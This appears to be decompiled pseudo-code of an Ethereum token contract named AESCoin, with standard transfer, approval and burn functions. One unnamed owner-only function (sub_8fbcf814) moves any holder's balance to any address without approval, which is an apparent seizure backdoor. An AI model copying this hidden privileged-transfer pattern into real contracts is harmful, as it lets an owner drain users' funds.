contract main {




// =====================  Runtime code  =====================


const name = ' AESCoin'

const decimals = 18

const symbol = 'AES'


uint256 totalSupply;
address stor1;
mapping of uint256 balances;
mapping of uint256 stor3;

function totalSupply() {
    return totalSupply
}

function balances(address arg1) {
    return balances[arg1]
}

function balanceOf(address arg1) {
    return balances[address(arg1)]
}

function _fallback() payable {
    revert
}

function transferOwnership(address arg1) {
    require msg.sender == stor1
    stor1 = arg1
}

function approve(address arg1, uint256 arg2) {
    stor3[msg.sender][address(arg1)] = arg2
    return 1
}

function burn(uint256 arg1) {
    require arg1 <= balances[msg.sender]
    require arg1 <= balances[msg.sender]
    balances[msg.sender] -= arg1
    require arg1 <= totalSupply
    totalSupply -= arg1
    emit Burn(arg1, msg.sender);
    return 1
}

function burnFrom(address arg1, uint256 arg2) {
    require arg2 <= balances[address(arg1)]
    require arg2 <= stor3[address(arg1)][msg.sender]
    require arg2 <= balances[address(arg1)]
    balances[address(arg1)] -= arg2
    require arg2 <= stor3[address(arg1)][msg.sender]
    stor3[address(arg1)][msg.sender] -= arg2
    require arg2 <= totalSupply
    totalSupply -= arg2
    emit Burn(arg2, arg1);
    return 1
}

function sub_8fbcf814(?) {
    require msg.sender == stor1
    require arg2
    require arg3 <= balances[address(arg1)]
    require balances[address(arg2)] + arg3 > balances[address(arg2)]
    require arg3 <= balances[arg1]
    balances[address(arg1)] = balances[arg1] - arg3
    require arg3 + balances[arg2] >= balances[arg2]
    balances[address(arg2)] = arg3 + balances[arg2]
    emit Transfer(arg3, arg1, arg2);
    require balances[arg1] + balances[address(arg2)] == balances[arg1] + balances[address(arg2)]
    return 1
}

function transfer(address arg1, uint256 arg2) {
    require arg1
    require arg2 <= balances[address(msg.sender)]
    require balances[address(arg1)] + arg2 > balances[address(arg1)]
    require arg2 <= balances[msg.sender]
    balances[address(msg.sender)] = balances[msg.sender] - arg2
    require arg2 + balances[arg1] >= balances[arg1]
    balances[address(arg1)] = arg2 + balances[arg1]
    emit Transfer(arg2, msg.sender, arg1);
    require balances[msg.sender] + balances[address(arg1)] == balances[msg.sender] + balances[address(arg1)]
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require arg3 <= stor3[address(arg1)][msg.sender]
    require arg3 <= stor3[address(arg1)][msg.sender]
    stor3[address(arg1)][msg.sender] -= arg3
    require arg2
    require arg3 <= balances[address(arg1)]
    require balances[address(arg2)] + arg3 > balances[address(arg2)]
    require arg3 <= balances[arg1]
    balances[address(arg1)] = balances[arg1] - arg3
    require arg3 + balances[arg2] >= balances[arg2]
    balances[address(arg2)] = arg3 + balances[arg2]
    emit Transfer(arg3, arg1, arg2);
    require balances[arg1] + balances[address(arg2)] == balances[arg1] + balances[address(arg2)]
    return 1
}



}
